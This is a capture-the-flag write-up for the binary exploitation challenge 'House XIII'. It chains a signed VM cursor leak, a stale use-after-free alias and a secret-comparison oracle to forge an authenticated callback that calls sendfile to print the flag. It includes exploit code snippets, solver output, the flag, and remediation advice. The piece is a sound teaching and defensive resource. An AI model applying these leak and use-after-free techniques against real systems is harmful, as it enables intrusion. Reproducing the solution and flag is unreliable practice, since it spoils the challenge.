# House XIII

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Binary Exploitation |
| Author | n00b |
| Points | 143 |
| Solves at time of solving | 70 |
| Flag | `zdk{HouSe_xLLl_0penS_wHeN_thE_st413_Aud1t_rECOrD_reWrL7e5_7h3_r0uTe}` |

> House XIII is back online. Complete your assignment and return with its
> authorization material.

## Executive Summary

`transit` is a stripped, menu-driven x86-64 service with two object types:
`STARGMTR` (Star) and `ORBITAL`. The binary includes a small bytecode VM, an
authenticated callback mechanism, and several convincing flag-shaped decoys.

The real exploit composes three weaknesses:

1. The VM accepts signed cursor changes but validates only a wrapped 16-bit
   effective offset. Moving the cursor to `-0x50` turns a nominal Star data read
   into an object-header read. Printing 16 bytes leaks the Star's self pointer
   and a code pointer, defeating heap and PIE ASLR.
2. Converting a Star to an Orbital frees the Star and allocates the same
   `0x180`-byte size, but does not clear the original Star-table entry. The new
   Orbital therefore has a stale Star alias. Control 2 trusts table membership
   without rechecking the Star magic, providing a controlled write over the
   Orbital's callback metadata.
3. Control 6 compares an attacker-supplied integer with the random 64-bit
   session secret and returns one of two statuses. A 64-query binary search
   recovers the exact secret, after which the callback credential can be
   recomputed rather than bypassed.

The forged callback points at a read-only slot containing an internal
`sendfile` routine. Setting the source descriptor and House marker to `13`
causes that routine to copy the pre-opened flag file to stdout. The supplied
[solver](solve.py) performs the entire exploit over TLS using only Python's
standard library.

## Repository Contents

| Path | Purpose | SHA-256 |
| --- | --- | --- |
| [`challenge/pwn_house-xiii.tar.gz`](challenge/pwn_house-xiii.tar.gz) | Original challenge handout | `2ea557444b06160088e6d5e483dfb65a1a918d167a1700b9607396eaed70c586` |
| [`challenge/transit`](challenge/transit) | Stripped challenge executable | `3f8d94edfe8d06ddc7139ad963c40961e3cd2a4ffb5f18b50298abc755f77e3a` |
| [`challenge/libc.so.6`](challenge/libc.so.6) | Supplied glibc 2.43 runtime | `d763925433ff9b757390549e1b20c085f5e6de27ae700fe89194178d96a8a2b0` |
| [`challenge/ld-linux-x86-64.so.2`](challenge/ld-linux-x86-64.so.2) | Supplied dynamic loader | `223b94a42758f2434da331cc0aa62db1af5b456481762c5caceefa1a2d1eb8fb` |
| [`solve.py`](solve.py) | Dependency-free end-to-end TLS exploit | `0ded863fd777c0f1338c845fe289571acf6f2546787b12c37edd873f9f3b8135` |
| [`artifacts/offsets.txt`](artifacts/offsets.txt) | Static offsets, structures, formulas, and opcodes | `20cfc1d37b0af937afcdbb8ef95edd8c46012c236dbd30b95de9a7f0f0748ba7` |
| [`artifacts/vm-leak-bytecode.bin`](artifacts/vm-leak-bytecode.bin) | Exact 48-byte metadata-leak program | `d6f47f79d9c80319c66f2390991a01d03a317fa62c3bbf5c9a718f12d5a8ac12` |
| [`artifacts/forged-orbital.bin`](artifacts/forged-orbital.bin) | Sample session-specific 40-byte Orbital forgery | `c9ee756e71bf240429474636420a487624fa61c6db25a3fbbcf039da8264ac43` |
| [`artifacts/remote-run.txt`](artifacts/remote-run.txt) | Successful remote exploit transcript | `b0d1dabc0e780b9f6f1731e7bfb8a2e31850acf82eb19a8c45e9779f8f9572dd` |

## 1. Initial Triage

The handout contains the executable and its exact runtime:

```console
$ tar -tzvf pwn_house-xiii.tar.gz
-rwxrwxrwx ... pwn_house-xiii/ld-linux-x86-64.so.2
-rwxrwxrwx ... pwn_house-xiii/libc.so.6
-rwxrwxrwx ... pwn_house-xiii/transit
```

The main binary is a small, stripped PIE:

```console
$ file transit
transit: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
         interpreter /lib64/ld-linux-x86-64.so.2, stripped
```

`rabin2 -I transit` reports all common mitigations:

| Mitigation | State | Consequence |
| --- | --- | --- |
| Full RELRO | Enabled | The callback slots cannot be overwritten directly |
| Stack canary | Enabled | Ordinary stack corruption would need a canary leak |
| NX | Enabled | Injected Star data and bytecode are not executable |
| PIE | Enabled | Internal callback and table addresses require a leak |
| Symbols | Stripped | Handler roles must be reconstructed from data flow |

The imports immediately identify several promising subsystems:

```text
getrandom  malloc  calloc  free  memcpy  strtoull
prctl      sendfile  fgets  printf  puts
```

`getrandom` suggests per-session state, while `sendfile` is unusually specific
for a menu service that otherwise performs text I/O. The latter becomes the
final target.

At startup, `transit` installs process restrictions with `prctl`, creates an
odd 64-bit secret at `0x5060`, and sets a 240-second alarm:

```c
getrandom(&session_secret, 8, 0);
session_secret |= 1;
alarm(240);
```

The large warning banner contains instructions aimed at automated tools. Those
strings are challenge theater embedded in `.rodata`; they have no bearing on
the authorized CTF scope or on the program's control flow.

## 2. Recovering the Control Surface

The visible menu deliberately labels operations with codes such as `ZX-41C`
and `QF-82A` instead of names. `main` reads an integer and dispatches through a
10-entry relative jump table at PIE offset `0x3258`.

Decoding those entries gives:

| Control | Handler | Reconstructed operation |
| --- | --- | --- |
| `0` | `0x1c50` | Exit |
| `1` | `0x1a60` | Allocate a Star |
| `2` | `0x1974` | Write into a Star's data area |
| `3` | `0x1851` | Upload a Star VM program |
| `4` | `0x170a` | Execute a Star VM program |
| `5` | `0x151f` | Convert a Star into an Orbital |
| `6` | `0x145a` | Compare an Orbital value with the secret |
| `7` | `0x13d1` | Authenticate and invoke an Orbital callback |
| `8` | `0x136c` | Free a Star |
| `9` | `0x1bc7` | Free an Orbital |

There are two global arrays of eight pointers:

```text
PIE+0x50c0  Star table
PIE+0x5080  Orbital table
```

Most handlers validate both table membership and an eight-byte object magic:

```text
Star magic:     53 54 41 52 47 4d 54 52  "STARGMTR"
Orbital magic:  4f 52 42 49 54 41 4c 00  "ORBITAL\0"
```

The one important exception is control 2, which checks only whether the Star
table entry is non-null.

## 3. Reconstructing the Objects

Both object types occupy `0x180` bytes. Following the initialization and field
accesses yields the relevant Star layout:

```c
struct Star {
    uint64_t magic;               // +0x000: "STARGMTR"
    uint64_t serial;              // +0x008
    void *self;                   // +0x010
    void (*code_pointer)(void);   // +0x018: PIE+0x2060
    uint64_t serial_checksum;     // +0x020
    uint8_t reserved[0x38];       // +0x028
    uint8_t data[0x80];           // +0x060
    uint8_t program[0x80];        // +0x0e0
    uint16_t program_length;      // +0x160
};
```

The Orbital's control-flow fields occupy the exact range exposed by the stale
Star write later in the exploit:

```c
struct Orbital {
    uint64_t magic;                  // +0x000: "ORBITAL"
    uint64_t serial;                 // +0x008
    uint8_t reserved[0x50];          // +0x010
    uint64_t encoded_callback_slot;  // +0x060
    uint64_t credential;             // +0x068
    uint64_t value;                  // +0x070
    int32_t source_fd;                // +0x078
    uint32_t house_marker;            // +0x07c
    uint64_t serial_relation;         // +0x080
    uint64_t status_or_receipt;       // +0x088
};
```

This is not a conventional saved-return-address challenge. The intended
control-flow target is represented explicitly in the object, but the pointer
is encoded and authenticated.

## 4. Identifying the Authorization Decoy

The serial counter at PIE offset `0x5010` is initialized to `0x1200`, not zero:

```console
$ objdump -s -j .data transit
Contents of section .data:
 5010 00120000 00000000
```

Control 1 increments this value before storing the new Star's serial. The first
Star therefore receives serial `0x1201`. A branch at `0x1ba8` compares against
that exact value and prints a flag-shaped authorization string from `0x3830`.

It is tempting to stop here because the service itself prints the value. That
string is a deliberate decoy: it is hard-coded in `.rodata`, does not exercise
the protected callback, and is rejected by the scoreboard. Several uppercase
`ZDK{...}` strings decoded from adjacent data are decoys as well.

The genuine objective must come from the `sendfile` path rather than from a
static authorization message.

## 5. Vulnerability One: Signed VM Cursor Leak

Control 3 accepts a hex-encoded program of at most 128 bytes and stores it at
Star offset `+0xe0`. Control 4 interprets four relevant opcodes:

| Opcode | Operand | Behavior |
| --- | --- | --- |
| `0x19` | signed byte | Add a signed delta to the data cursor |
| `0x2d` | none | Print `data[cursor]` as two hexadecimal digits |
| `0x43` | none | XOR `data[cursor]` into an accumulator |
| `0x71` | none | Print the accumulator |

The VM intends to constrain data accesses to Star offsets `+0x60` through
`+0xdf`. Its cursor update is effectively:

```c
int delta = (int8_t)program[++pc];
int next = cursor + delta;
uint16_t effective = (uint16_t)(next + 0x60);

if (effective <= 0xdf)
    cursor = next;
```

There is an upper bound but no lower bound before the value is truncated to 16
bits. From the initial cursor zero, delta `-0x50` is accepted because:

```text
cursor    = -0x50
effective = -0x50 + 0x60 = 0x10
0x10 <= 0xdf
```

Opcode `0x2d` then reads `object + 0x10`, not `object + 0x60`.

### 5.1 Building the leak program

The exploit starts with `0x19 0xb0`, where `0xb0` is signed `-0x50`. It prints
one byte, advances by one, and repeats until 16 bytes have been exposed:

```python
bytecode = bytearray([0x19, 0xB0])
for index in range(16):
    bytecode.append(0x2D)
    if index != 15:
        bytecode.extend((0x19, 0x01))
```

The complete 48-byte program is preserved as
[`vm-leak-bytecode.bin`](artifacts/vm-leak-bytecode.bin). Its output is exactly
the Star fields at `+0x10` and `+0x18`:

```text
result:20acfd78555500006030c0653d7f0000
       |--------------| |--------------|
          self pointer     code pointer
```

Interpreting each eight-byte group as little-endian gives:

```text
Star address:  0x555578fdac20
Code pointer:  0x7f3d65c03060
```

The code pointer was initialized to `PIE+0x2060`, so:

```python
pie_base = code_pointer - 0x2060
# 0x7f3d65c01000 in the recorded run
```

One short VM program has now defeated both heap and PIE randomization.

## 6. Vulnerability Two: Stale Cross-Type Alias

Control 5 takes a populated Star index and an empty Orbital index. The relevant
sequence at `0x15c6` is:

```c
Star *old = star_table[source];
uint64_t old_serial = old->serial;

free(old);
Orbital *orb = calloc(1, 0x180);
initialize_orbital(orb, old_serial);
orbital_table[destination] = orb;
```

The missing operation is:

```c
star_table[source] = NULL;
```

With no competing allocation in the same size class, the supplied glibc
reuses the just-freed `0x180` allocation for `calloc`. After conversion, the
tables therefore look like:

```text
Star table[0]     ----+
                       +----> same 0x180-byte Orbital allocation
Orbital table[0]  ----+
```

The usual Star-only controls reject the alias because the object now has
`ORBITAL` magic. Control 2 is different. Its handler at `0x1974` checks that
the Star-table pointer exists, validates only a position and length, then does:

```c
memcpy(star_table[id] + 0x60 + position, decoded_blob, length);
```

It never checks `STARGMTR`. With position zero, this stale alias can overwrite
Orbital offsets `+0x60` through `+0xdf`, including every callback and
descriptor field needed for the endgame.

## 7. Vulnerability Three: Recovering the Session Secret

The Orbital conversion protects its callback slot with the random secret at
`PIE+0x5060`. Blindly overwriting the encoded pointer would fail the credential
check, so the secret must be recovered first.

Control 6 provides a direct unsigned comparison oracle. It stores the supplied
value and returns one of two printable statuses:

```c
orb->value = candidate;
if (candidate < session_secret)
    orb->status = 0x31;
else
    orb->status = 0x73;

printf("status:%02lx\n", orb->status);
```

The range is the complete unsigned 64-bit domain. Standard lower-bound binary
search recovers the exact value in at most 64 requests:

```python
low, high = 0, (1 << 64) - 1

while low < high:
    candidate = (low + high) // 2
    status = query(candidate)
    if status == 0x31:          # candidate < secret
        low = candidate + 1
    else:                       # candidate >= secret
        high = candidate

secret = low
```

The recorded session converged to:

```text
session_secret = 0xca4027651191083b
```

The operation fits comfortably inside the 240-second alarm. A typical run
takes roughly 45 seconds, with almost all of that time spent on the 64 network
round trips.

## 8. Reconstructing the Callback Credential

Orbital initialization encodes the address of a callback *slot*, not the
callback function itself:

```c
orb->encoded_callback_slot =
    rol64((PIE + 0x4cf8) ^ session_secret, 17);
```

Control 7 first recomputes a credential at `0x1f40`. If it matches the qword at
`+0x68`, the handler reverses the encoding, dereferences the resulting slot,
and calls the function stored there:

```c
if (credential_hash(encoded, relation, orb, secret) != orb->credential)
    reject();

slot = ror64(encoded, 17) ^ secret;
callback = *(void (**)(Orbital *))slot;
callback(orb);
```

The hash uses a SplitMix64-style finalizer:

```python
def mix64(x):
    x ^= x >> 30
    x *= 0xBF58476D1CE4E5B9
    x ^= x >> 27
    x *= 0x94D049BB133111EB
    x ^= x >> 31
    return x & ((1 << 64) - 1)
```

The three authenticated lanes are the encoded slot, the serial relation, and
the heap object address, each mixed with a rotated form of the secret. In
compact form, with all arithmetic modulo `2^64`:

```text
P = mix64(rol(secret,29) + 0xd1a613c0dec0ffee + encoded)
R = rol(mix64(ror(secret,11) + 0x13f0a5b7c9e2468d + relation), 23)
O = ror(mix64(rol(secret,7) + 0xa57ea1c49d2036bf + object), 9)

credential = mix64(encoded * 0x9e3779b185ebca87 ^ P ^ R ^ O)
```

Because the exploit has already leaked `object` and recovered `secret`, this
credential is reproducible exactly. Full RELRO remains intact; there is no need
to modify either read-only callback slot.

## 9. Selecting the Real Callback

`.data.rel.ro` contains two adjacent function pointers:

```console
$ objdump -s -j .data.rel.ro transit
Contents of section .data.rel.ro:
 4cf0 60210000 00000000 20210000 00000000
      |---- 0x2160 ----| |---- 0x2120 ----|
```

Their roles are:

| Slot | Function | Behavior |
| --- | --- | --- |
| `PIE+0x4cf8` | `PIE+0x2120` | Print a receipt and another decoy |
| `PIE+0x4cf0` | `PIE+0x2160` | Validate House fields and call `sendfile` |

The target slot is therefore:

```python
sendfile_slot = pie_base + 0x4CF0
encoded = rol64(sendfile_slot ^ secret, 17)
```

The first Star has serial `0x1201`. Conversion increments the global counter,
giving the Orbital serial `0x1202`. Its authenticated relation is:

```text
relation = 0x1201 ^ 0x1202 = 3
```

The internal function at `0x2160` performs these checks and call:

```c
if (orb->house_marker != 13 || orb->source_fd < 0) {
    puts("operation unavailable");
    return;
}

off_t offset = 0;
sendfile(1, orb->source_fd, &offset, 0x400);
```

The challenge launcher supplies the protected file on descriptor 13, matching
both the title and the marker check. The exploit sets both 32-bit fields to 13.

## 10. Forging the Orbital

Control 2 writes the following 40 bytes at stale Star data position zero,
which corresponds to Orbital offset `+0x60`:

| Relative offset | Size | Forged value |
| --- | --- | --- |
| `0x00` | 8 | Encoded address of callback slot `PIE+0x4cf0` |
| `0x08` | 8 | Recomputed credential hash |
| `0x10` | 8 | Value field, zeroed |
| `0x18` | 4 | Source descriptor `13` |
| `0x1c` | 4 | House marker `13` |
| `0x20` | 8 | Serial relation `3` |

The solver builds it directly:

```python
forged_fields = struct.pack(
    "<QQQIIQ",
    encoded_callback,
    credential,
    0,
    13,
    13,
    relation,
)
```

For the sample session, the resulting
[`forged-orbital.bin`](artifacts/forged-orbital.bin) is:

```text
00000000  80 94 97 a9 a2 e8 b0 b0  d1 7e e2 e4 63 06 4c 61
00000010  00 00 00 00 00 00 00 00  0d 00 00 00 0d 00 00 00
00000020  03 00 00 00 00 00 00 00
```

Control 7 now accepts the credential, decodes the forged slot, calls
`PIE+0x2160`, and copies descriptor 13 to stdout.

## 11. Complete Exploit Sequence

The full solve is deterministic within one TLS session:

1. Connect and wait for `control> `.
2. Use control 1 to allocate Star ID 0. Ignore the hard-coded decoy printed by
   the serial-`0x1201` branch.
3. Use control 3 to upload the 48-byte negative-cursor program.
4. Use control 4 to execute it and parse 16 leaked bytes.
5. Recover the heap object directly and compute `PIE = leaked_code - 0x2060`.
6. Use control 5 to convert Star 0 into Orbital 0, leaving the stale Star alias.
7. Query control 6 at most 64 times to binary-search the session secret.
8. Encode callback slot `PIE+0x4cf0` and recompute the credential with relation
   3 and the leaked heap address.
9. Use control 2 through the stale Star entry to overwrite Orbital offsets
   `+0x60..+0x87` with the 40-byte forgery.
10. Use control 7 to authenticate the object and invoke the `sendfile` callback.
11. Extract the lowercase `zdk{...}` value from the final response.

No brute force, shellcode, ROP chain, libc offset, or allocator-address guess is
required. The only repeated step is the exact 64-bit comparison search.

## 12. Running the Solver

The solver requires Python 3.10 or newer and no third-party packages:

```console
$ cd Pwn/house-xiii
$ ./solve.py -v
[+] heap object:       0x0000555578fdac20
[+] PIE base:          0x00007f3d65c01000
[+] session secret:    0xca4027651191083b
[+] encoded callback:  0xb0b0e8a2a9979480
[+] credential hash:   0x614c0663e4e27ed1
[+] flag: zdk{HouSe_xLLl_0penS_wHeN_thE_st413_Aud1t_rECOrD_reWrL7e5_7h3_r0uTe}
```

An alternate host and port can be supplied positionally. `--dump-dir` saves the
exact VM program and session-specific forged fields:

```console
$ ./solve.py example.org 1337 --timeout 30 --dump-dir ./run-artifacts
```

## 13. Why the Mitigations Do Not Stop the Exploit

| Mitigation | Why it is insufficient |
| --- | --- |
| PIE | The signed VM cursor discloses an in-object code pointer |
| Heap ASLR | The same VM leak discloses the object's self pointer |
| Full RELRO | The exploit selects an existing read-only slot instead of modifying it |
| NX | Control flow stays inside the binary's internal callbacks |
| Stack canary | The stack is never corrupted |
| Encoded callback | Control 6 discloses the complete encoding secret |
| Credential hash | Every authenticated input becomes known and the hash is reproducible |
| Process restrictions | `sendfile` is already imported and intentionally available |

The challenge is a useful example of why several individually modest logic
errors can defeat a comparatively elaborate control-flow integrity design.

## 14. Remediation

The vulnerability chain can be broken at multiple ownership boundaries:

1. Validate the VM cursor as a full-width signed value before forming an
   address: require `0 <= next && next < sizeof(star->data)`.
2. Clear `star_table[source]` immediately when ownership is transferred, or
   mutate one object in place without retaining a second typed handle.
3. Make every Star handler verify the `STARGMTR` magic before dereferencing or
   writing through a table entry.
4. Do not expose comparisons against cryptographic secrets. Return one uniform
   failure state and authenticate complete requests in constant time.
5. Avoid storing privileged callback selection and file-descriptor state in a
   region writable through ordinary object-data operations.
6. Keep the flag descriptor out of the child process unless and until a trusted
   authorization decision has completed.

## Flag

```text
zdk{HouSe_xLLl_0penS_wHeN_thE_st413_Aud1t_rECOrD_reWrL7e5_7h3_r0uTe}
```
